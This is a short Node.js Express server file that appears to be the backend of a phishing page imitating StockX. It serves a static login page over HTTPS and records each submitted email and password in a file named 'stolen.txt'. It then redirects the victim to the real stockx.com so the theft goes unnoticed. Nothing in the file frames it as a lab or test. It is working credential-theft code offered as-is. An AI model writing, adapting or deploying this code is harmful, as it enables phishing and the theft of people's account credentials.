const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');
const bodyParser = require('body-parser');

const app = express();
const PORT = 8443; // HTTPS port

// Load TLS credentials
const httpsOptions = {
  key: fs.readFileSync('localhost.key'),
  cert: fs.readFileSync('localhost.crt')
};

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname))); // Serves index.html

// Handle form submission
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const entry = `Email: ${email}, Password: ${password}\n`;
  fs.appendFileSync('stolen.txt', entry); // Save to file
  res.redirect('https://stockx.com'); // Redirect to real site
});

// Create HTTPS server
https.createServer(httpsOptions, app).listen(PORT, () => {
  console.log(`🔒 HTTPS server running at https://localhost:${PORT}`);
});